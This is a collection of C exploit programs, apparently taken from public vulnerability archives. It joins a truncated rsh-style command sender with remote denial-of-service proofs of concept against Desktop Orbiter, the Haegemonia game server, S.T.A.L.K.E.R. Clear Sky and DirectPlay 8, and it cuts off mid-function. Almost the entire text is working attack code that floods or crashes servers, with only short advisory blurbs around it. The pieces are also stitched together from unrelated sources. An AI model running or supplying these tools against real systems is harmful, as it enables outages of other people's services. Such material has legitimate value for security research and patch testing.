        LPHOSTENT lpHostEnt;
        SOCKADDR_IN sockAddr;
        int res, on = 1;
        char *stderr_port = "1024";
        char *local_user  = "Administrator";
        char *remote_user = "root";
        char *cmd = "ver";

        res = WSAStartup(MAKEWORD( 2, 2 ),
&WSAData);
        if(res != 0){
                res = WSAGetLastError();
                printf("WSAStartup() failed,
WSAGetLastError: %d\n", res);
                return 1;
        }

        lpHostEnt = gethostbyname(HOST);
        if(lpHostEnt == NULL){
                res = WSAGetLastError();
                printf("gethostbyname() failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }

        s = socket(AF_INET, SOCK_STREAM,
IPPROTO_TCP);
        if(s == INVALID_SOCKET){
                res = WSAGetLastError();
                printf("socket() failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }

        sockAddr.sin_family     = AF_INET;
        sockAddr.sin_port       = htons(PORT);
        sockAddr.sin_addr       = *((LPIN_ADDR)
*lpHostEnt->h_addr_list);

        res = connect(s, (PSOCKADDR)
&sockAddr, sizeof(sockAddr));
        if(res != 0){
                res = WSAGetLastError();
                printf("connect() failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }

        Sleep(400);
        res = send(s, stderr_port, strlen
(stderr_port)+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(stderr_port) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }
        printf("send(stderr_port): %d\n", res);

        Sleep(400);
        res = send(s, local_user, strlen(local_user)
+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(local_user) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }
        printf("send(local_user): %d\n", res);


        Sleep(400);
        res = send(s, remote_user, strlen
(remote_user)+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(remote_user) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }
        printf("send(remote_user): %d\n", res);


        Sleep(400);
        res = send(s, cmd, strlen(cmd)+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(cmd) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }
        printf("send(cmd): %d\n", res);

        WSACleanup();
        return 0;
}source: http://www.securityfocus.com/bid/7759/info

A denial of service vulnerability has been reported for Desktop Orbiter. The vulnerability exists due to the way the application handles connections. Specifically, for every open connection, a snapshot preview of the desktop is loaded into memory. Thus, numerous connections would result in a consumption of all available memory resources.

#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 51054

int main(int argc, char *argv[]){

int sockfd;
struct hostent *he;
struct sockaddr_in their_addr;

int c;
int n;
char *host = NULL;
int cnt=1;

if(argc < 2 ) {
printf("Usage:%s -h <host>\n",argv[0]);
exit(0);
}


while((n = getopt(argc, argv, "h")) != -1) {
                switch(n) {
                        case 'h':
                        host = optarg;
                        break;

                        default:
                        printf("Bad Input\n");
                        exit(0);
                }
        }


if ((he = gethostbyname(argv[2])) == NULL)
          {
                  herror("gethostbyname");
                  exit(1);
          }

        their_addr.sin_family = AF_INET;
        their_addr.sin_port = htons(PORT);
        their_addr.sin_addr = *((struct in_addr *) he->h_addr);
        bzero(&(their_addr.sin_zero), 8);

printf
("\n\n\t\t#########################################################\n");
printf("\t\t# Proof of Concept by Luca Ercoli luca.ercoli@inwind.it #\n");
printf("\t\t#         Desktop Orbiter 2.01 Denial of Service        #\n");
printf
("\t\t#########################################################\n\n");
printf("\nAttacking....\n\a");


if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
          {
                  perror("socket");
                  exit(1);
          }

       if (connect (sockfd, (struct sockaddr *) &their_addr,sizeof(struct
sockaddr)) == -1)
          {
                 perror("connect");
exit(0);
}


for (c=0;c<99500;c++){

if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
          {
                  perror("socket");
                  exit(1);
          }


        if (connect (sockfd, (struct sockaddr *) &their_addr,
sizeof(struct sockaddr)) == -1)
          {

printf("\n[Attack status] Step %d/25 : Complete!",cnt);

if (cnt == 25) {
printf("\nAttack Complete!\n\n\a");
exit(0);
}

cnt++;

sleep(1);

          }


close(sockfd);

}

printf("\n");
return 1;

}
source: http://www.securityfocus.com/bid/9736/info

It has been reported that the Digital Reality Game engine is prone to a remote denial of service vulnerability. This issue is due to a failure of the application to validate packet data size input supplied by a client.

The immediate consequences of a successful attack will cause the affected server to crash. It has been conjectured that this issue may also be leveraged to execute arbitrary code in the context of the affected application, however this has not been verified.

/*

by Luigi Auriemma

UNIX & WIN VERSION
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif




#define VER     "0.1"
#define BUFFSZ  2048
#define PORT    19664
#define TIMEOUT 5
#define SEND(x) if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, psz) \
                  < 0) std_err();
#define RECV    if(recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz) \
                  < 0) std_err();
#define JOIN    "\x00\x00"
#define BOOM    "\x10\x00\x00\x03\x0b\x01" \
/* boom */      "\xff\xff\xff\xff" \
/* message */   "boomyeah"




int timeout(int sock);
u_long resolv(char *host);
void std_err(void);




int main(int argc, char *argv[]) {
    int         sd,
                psz;
    u_short     port = PORT;
    u_char      *buff;
    struct  sockaddr_in peer;

    setbuf(stdout, NULL);

    fputs("\n"
        "Haegemonia <= 1.07 remote server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\nUsage: %s <server> [port(%u)]\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;
    psz                  = sizeof(peer);

    printf("\nStarting attack versus %s:%hu\n\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("- sending JOIN packet\n", stdout);
    SEND(JOIN);
    if(timeout(sd) < 0) {
        fputs("\nError: socket timeout, server is probably not online\n", stdout);
        exit(1);
    }
    buff = malloc(BUFFSZ);
    if(!buff) std_err();
    RECV;

    fputs("- sending BOOM packet\n", stdout);
    SEND(BOOM);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!!!!!\n", stdout);
    } else {
        fputs("\nServer doesn't seem to be vulnerable\n", stdout);
    }
    close(sd);

    return(0);
}




int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}




u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define BUFFSZ      1472
#define PORT        5445



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int putcc(u8 *dst, int chr, int len);
int putws(u8 *dst, u8 *src);
int fgetz(FILE *fd, u8 *data, int size);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u32     res,
            ver,
            seed;
    int     sd,
            i,
            len,
            pwdlen,
            nicklen,
            pck,
            invisible   = 0;
    u16     port        = PORT;
    u8      buff[BUFFSZ],
            nick[64 + 1],
            pwd[64]     = "",
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "S.T.A.L.K.E.R. Clear Sky <= 1.5.10 unhandled exception "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    host = argv[1];
    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    ver = 0x00010006;
    printf("\n- use version %08x\n", ver);
    seed = time(NULL);

    for(;;) {
        printf("\n  Player: ");

        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();

        seed = (seed * 0x343FD) + 0x269EC3;

        for(pck = 0; pck <= 4; pck++) {
            if((pck == 4) && invisible) break;      // invisible mode

            p = buff;
            switch(pck) {
                case 0: {
                    *p++ = 0x88;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    *p++ = 0x00;
                    p += putxx(p, ver,        32);
                    p += putxx(p, seed,       32);
                    p += putxx(p, seed,       32);  // should be a different number
                    break;
                }
                case 1: {
                    *p++ = 0x80;
                    *p++ = 0x02;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    p += putxx(p, ver,        32);
                    p += putxx(p, seed,       32);
                    p += putxx(p, seed,       32);  // should be a different number
                    break;
                }
                case 2: {
                    *p++ = 0x3f;
                    *p++ = 0x02;
                    *p++ = 0x00;
                    *p++ = 0x00;
                    p += putxx(p, seed,       32);
                    break;
                }
                case 3: {
                    memset(nick, 'a', sizeof(nick));
                    nick[64] = 0;

                    *p++ = 0x7f;
                    *p++ = 0x00;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    p += putxx(p, 0x000000c1, 32);
                    p += putxx(p, 0x00000002, 32);
                    p += putxx(p, 0x00000007, 32);
                    p += putcc(p, 0,          0x50);// hash at 0x48 set to zeroes
                    pwdlen = putws(p, pwd);   p += pwdlen;
                    p += putcc(p, 0,          4);   // don't know
                    strncpy(p, nick, 0x80);   p += 0x80;
                    p += putxx(p, 1,          32);
                    nicklen = putws(p, nick); p += nicklen;

                    putxx(buff + 0x10, 0xe0 + pwdlen, 32);
                    putxx(buff + 0x14, nicklen, 32);
                    putxx(buff + 0x18, 0x58 + pwdlen, 32);
                    if(pwd[0]) putxx(buff + 0x20, 0x58, 32);
                    putxx(buff + 0x24, pwdlen, 32);
                    break;
                }
                case 4: {
                    *p++ = 0x7f;
                    *p++ = 0x00;
                    *p++ = 0x02;
                    *p++ = 0x02;
                    p += putxx(p, 0x000000c3, 32);
                    break;
                }
                default: break;
            }

            len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);

            if(pck == 3) {
                while(buff[0] != 0x7f) {
                    len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 1);
                }
                getxx(buff + 8, &res, 32);
                if(res == 0x80158410) {
                    printf("\n- server is protected by password, insert it: ");
                    fgetz(stdin, pwd, sizeof(pwd));
                    break;
                } else if(res == 0x80158610) {
                    printf("\n  server full ");
                    for(i = 5; i; i--) {
                        printf("%d\b", i);
                        sleep(ONESEC);
                    }
                    break;
                } else if(res == 0x80158260) {
                    printf("\nError: your IP is banned\n");
                    exit(1);
                } else if(res) {
                    printf("\n- unknown error number (0x%08x), I try to continue", res);
                    //exit(1);
                } else {
                    // do NOT break it
                }
            }
        }

        close(sd);
    }
    printf("\n- check the server manually for verifying if it's vulnerable or not\n");
    return(0);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 1)) break;
        }
    } else {
        if(timeout(sd, 2) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-1);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int putcc(u8 *dst, int chr, int len) {
    memset(dst, chr, len);
    return(len);
}



int putws(u8 *dst, u8 *src) {
    u8      *d,
            *s;

    if(!src[0]) return(0);  // as required by stalker
    for(s = src, d = dst; ; s++) {
        *d++ = *s;
        *d++ = 0;
        if(!*s) break;
    }
    return(d - dst);
}



int fgetz(FILE *fd, u8 *data, int size) {
    u8     *p;

    if(!fgets(data, size, fd)) return(-1);
    for(p = data; *p && (*p != '\n') && (*p != '\r'); p++);
    *p = 0;
    return(p - data);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;
    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << (i << 3));
    }
    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
    Copyright 2004-2010 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl-2.0.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include "show_dump.h"

#ifdef WIN32
    #include <winsock.h>
    #include <malloc.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stricmp strcasecmp
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1.3"
#define BUFFSZ      0xffff
#define INFOPORT    6073
#define TIMEOUT     2
#define MAX_PCKS    14
#define DEFAULT     "default"

#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) \
                      < 0) std_err(); \
                    fputc('.', stdout);

#define GS1_QUERY   "\\info\\"              // \status\ returns 3 packets, I'm too lazy to handle all of them
#define GS2_QUERY   "\xfe\xfd\x00" "\x00\x00\x00\x00"                    "\xff\x00\x00" "\x00"
#define GS3_QUERY   "\xfe\xfd\x09" "\x00\x00\x00\x00"
#define GS3_QUERYX  "\xfe\xfd\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00" "\xff\x00\x00" "\x00"



int dplay8info(u32 ip, u16 *port, u8 *buff);
void show_unicode(u8 *ptr, u32 size);
int timeout(int sock);
u32 resolv(char *host);
void std_err(void);



typedef struct {
    u32     g1;
    u16     g2;
    u16     g3;
    u8      g4;
    u8      g5;
    u8      g6;
    u8      g7;
    u8      g8;
    u8      g9;
    u8      g10;
    u8      g11;
} guid_t;

typedef struct {
    u32     pcklen;
    u32     reservedlen;
    u32     flags;
    u32     session;
    u32     max_players;
    u32     players;
    u32     fulldatalen;
    u32     desclen;
    u32     dunno1;
    u32     dunno2;
    u32     dunno3;
    u32     dunno4;
    u32     datalen;
    u32     appreservedlen;
    guid_t  instance_guid;
    guid_t  application_guid;
} dplay8_struct_t;



int main(int argc, char *argv[]) {
    struct  linger  ling = {1,1};
    struct  sockaddr_in peer,
                        peerl;
    FILE    *fd;
    u32     client_chall;
    int     sd,
            joinlen,
            len,
            player,
            type,
            pcks,
            skipguids = 0;
    u16     port;
    u8      *buff,
            info[] =
                "\x00\x02"          /* info/join */
                "\xff\xff"          /* ID tracker */
                "\x02",             /* 01 = need GUID */
                                    /* 02 = no GUID = cool */
            pck1[] =
                "\x88\x01\x00\x00\x06\x00\x01\x00"
                "\xff\xff\xff\xff"
                "\xff" "\xff\xff\x00",
            pck2[] =
                "\x80\x02\x01\x00\x06\x00\x01\x00"
                "\xff\xff\xff\xff"
                "\xff" "\xff\xff\x00",
            pck3[] =
                "\x3F\x02\x00\x00"
                "\xff\xff\xff\xff",
            pck4[] =    // default join_file
                "\x7F\x00"
                "\x01\x00"
                "\xC1\x00\x00\x00"                  // if you use values major than 0xc1... bye bye server
                "\x02\x00\x00\x00"                  // in the old version of dplay8fp I used 4
                "\x07\x00\x00\x00"
                "\x58\x00\x00\x00"                  // data length (set it to 0 for the NULL pointer bug)
                "\x0E\x00\x00\x00"                  // nickname length
                "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"  // dunno
                "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"  // dunno
                "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"  // GUID 1
                "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"  // GUID 2
                "\x00\x00\x00\x00"                  // dunno
                "\x00\x00\x00\x00"                  // reserved length
                "F\0""a\0""k\0""e\0""r\0""z\0""\0\0",   // player name (Fakerz)
            pck5[] =
                "\x7f\x00\x02\x02\xc3\x00\x00\x00",
            dplay8blah1[] =
                "\x7f\x00\x01\x00\xc2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            dplay8blah2[] =
                "\x7f\x00\x01\x00\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            dplay8blah3[] =
                "\x7f\x00\x01\x00\xcc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            *joinpck,
            *fname,
            *host;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "DirectPlay 8 Fake Players DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 4) {
        printf("\n"
            "Usage: %s <join_file> <host> <port>\n"
            "\n"
            " use \"%s\" or \"\" as join_file to use the default join packet used by\n"
            " some games.\n"
            " password protected servers are supported only with custom join_files.\n"
            " read dplay8fp.txt for more informations and details.\n"
            " use dplay8blah1, dplay8blah2 or dplay8blah3 for testing this vulnerability.\n"
            "\n", argv[0], DEFAULT);
        exit(1);
    }

    fname = argv[1];
    host  = argv[2];
    port  = atoi(argv[3]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target:                   %s : %hu\n",
        inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    if(!fname[0] || !stricmp(fname, DEFAULT)) {
        printf("- default built-in join packet selected\n");
        joinpck = pck4;
        joinlen = sizeof(pck4) - 1;
    } else if(!stricmp(fname, "dplay8blah1")) {
        joinpck = dplay8blah1;
        joinlen = sizeof(dplay8blah1) - 1;
    } else if(!stricmp(fname, "dplay8blah2")) {
        joinpck = dplay8blah2;
        joinlen = sizeof(dplay8blah2) - 1;
    } else if(!stricmp(fname, "dplay8blah3")) {
        joinpck = dplay8blah3;
        joinlen = sizeof(dplay8blah3) - 1;
    } else {
        joinpck = malloc(BUFFSZ);
        if(!joinpck) std_err();
        printf("- open join_file:           %s\n", fname);
        fd = fopen(fname, "rb");
        if(!fd) {
            buff = malloc(strlen(fname) + 4);
            sprintf(buff, "%s.d8f", fname);
            fname = buff;
            if(!fd) std_err();
        }
        joinlen = fread(joinpck, 1, BUFFSZ, fd);
        fclose(fd);
        printf("- join_file loaded, size:   %d\n", joinlen);
    }

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    printf("- query DirectPlay 8 port %d:\n", INFOPORT);
    if(dplay8info(peer.sin_addr.s_addr, &peer.sin_port, buff)) {
        printf(
            "- The server is protected by password.\n"
            "  Be sure to use a join_file containing the exact password for this server!\n");
    }

    client_chall = peerl.sin_port + ~time(NULL);    // a bit random

    player = 0;
    for(;;) {
        printf("\n  Player: ");

            /* lame random stage, ignore it */
        *(u32 *)(pck1 + 12) = client_chall;
        *(u32 *)(pck2 + 12) = client_chall;
        pck2[12]++;

        client_chall += peerl.sin_port;
        *(u32 *)(pck1 + 8)  = client_chall;
        *(u32 *)(pck2 + 8)  = client_chall;
        *(u32 *)(pck3 + 4)  = client_chall;

        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
        do {
            peerl.sin_port++;
        } while(bind(sd, (struct sockaddr *)&peerl, sizeof(peerl)) < 0);

        if(!skipguids) {
            *(u16 *)(info + 2) = ~client_chall;
            SEND(info, sizeof(info) - 1)
            if(timeout(sd) < 0) {
                printf("\n"
                    "Alert: socket timeout, no reply received. I try to continue skipping the\n"
                    "       collecting of the GUIDs (useless if you use a custom join_file)\n");
                skipguids = 1;
            } else {
                len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
                if(len < 0) std_err();
                fputc('.', stdout);
                if(joinlen >= (56+32)) memcpy(joinpck + 56, buff + 60, 32);
            }
        }

        len  = 0;
        type = 1;
        for(pcks = 0; pcks < MAX_PCKS; pcks++) {
            switch(type) {
                case 1: SEND(pck1, sizeof(pck1) - 1)    break;
                case 2: SEND(pck2, sizeof(pck2) - 1)    break;
                case 3: SEND(pck3, sizeof(pck3) - 1)    break;
                case 4: SEND(joinpck, joinlen)          break;
                default: {
                    type = 1;   // redo
                    //pcks = 0; // do NOT reset it
                    break;
                }
            }

            if(timeout(sd) < 0) {
                printf("\nAlert: socket timeout, no reply received\n");
                //exit(1);
                continue;
            }
            len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
            if(len < 0) std_err();
            fputc('.', stdout);

            if(buff[0] == 0x7f) break;
            if(buff[0] == 0x5f) break;  // seems this one too (tested in Sacrifice)
            if((buff[0] == 0x88) || (buff[0] == 0x3f) || (buff[0] == 0x80)) {
                type++;
            }
        }

        if((pcks >= MAX_PCKS) || (buff[4] != 0xc2) /* || (buff[0] != 0x7f) */ || (len < 32)) {
            printf("\n- server full%s", (!player) ? " or player not been accepted" : "");
            sleep(ONESEC);
            player = 0;
        } else {
            SEND(pck5, sizeof(pck5) - 1)    // required, otherwise the player doesn't join
            player++;
        }

        close(sd);
    }

    return(0);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



int dplay8info(u32 ip, u16 *port, u8 *buff) {
    struct  sockaddr_in peer;
    dplay8_struct_t *dplay8;
    struct  timeval tout;
    fd_set  fd_read;
    u32     chall;
    int     sd  = 0,
            sd2 = 0,
            len,
            password = 0,
            oldtype  = 0,
            retver   = 0;
    u8      gs3[sizeof(GS3_QUERYX) - 1],
            *gamever    = NULL,
            *hostport   = NULL;
    u8      info[]   =
                "\x00\x02"          /* info/join */
                "\xff\xff"          /* ID tracker */
                "\x02";             /* 01 = need GUID */
                                    /* 02 = no GUID = cool */

    // DirectPlay8 query to port 6073
    peer.sin_addr.s_addr = ip;
    peer.sin_port        = htons(INFOPORT);
    peer.sin_family      = AF_INET;
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    *(u16 *)(info + 2) = ~time(NULL);
    sendto(sd, info, sizeof(info) - 1, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));

    // Gamespy query
    peer.sin_addr.s_addr = ip;
    peer.sin_port        = *port;
    peer.sin_family      = AF_INET;
    sd2 = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd2 < 0) std_err();
    sendto(sd2, GS1_QUERY, sizeof(GS1_QUERY) - 1, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
    sendto(sd2, GS2_QUERY, sizeof(GS2_QUERY) - 1, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
    //sendto(sd2, GS3_QUERY, sizeof(GS3_QUERY) - 1, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));

    /*if(timeout(sd) < 0) {
        printf("\n"
            "Alert: the host has not replied to the query, probably it is not online or is\n"
            "       not a DirectPlay server. I try to continue...\n");
        goto quit;
    }*/

    for(;;) {
        tout.tv_sec  = TIMEOUT;
        tout.tv_usec = 0;
        FD_ZERO(&fd_read);
        FD_SET(sd, &fd_read);
        FD_SET(sd2, &fd_read);
        if(select(sd + sd2 + 1, &fd_read, NULL, NULL, &tout)
          <= 0) break;

        if(FD_ISSET(sd, &fd_read)) {
            len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
            if(len < 0) {
                continue;
                //goto quit;  // avoids "Connection reset by peer"
                //std_err();
            }

            if(len < (sizeof(dplay8_struct_t) + 4)) {
                printf("\nError: the packet received seems invalid\n");
                exit(1);
            }

            dplay8 = (dplay8_struct_t *)(buff + 4);

            if(dplay8->session) {
                printf("\nSession options:     ");
                if(dplay8->session & 1) printf("client-server ");
                if(dplay8->session & 4) printf("migrate_host ");
                if(dplay8->session & 64) printf("no_DPN_server ");
                if(dplay8->session & 128) {
                    printf("password ");
                    password = 1;
                }
            }

            printf("\n"
                "Max players          %u\n"
                "Current players      %u\n",
                dplay8->max_players,
                dplay8->players);

            printf("\n"
                "Instance GUID        %08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x",
                dplay8->instance_guid.g1,
                dplay8->instance_guid.g2,
                dplay8->instance_guid.g3,
                dplay8->instance_guid.g4,
                dplay8->instance_guid.g5,
                dplay8->instance_guid.g6,
                dplay8->instance_guid.g7,
                dplay8->instance_guid.g8,
                dplay8->instance_guid.g9,
                dplay8->instance_guid.g10,
                dplay8->instance_guid.g11);

            printf("\n"
                "Application GUID     %08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x\n",
                dplay8->application_guid.g1,
                dplay8->application_guid.g2,
                dplay8->application_guid.g3,
                dplay8->application_guid.g4,
                dplay8->application_guid.g5,
                dplay8->application_guid.g6,
                dplay8->application_guid.g7,
                dplay8->application_guid.g8,
                dplay8->application_guid.g9,
                dplay8->application_guid.g10,
                dplay8->application_guid.g11);

                // removed any security check here

            printf("\nGame description/Session name:\n\n  ");
            show_unicode(
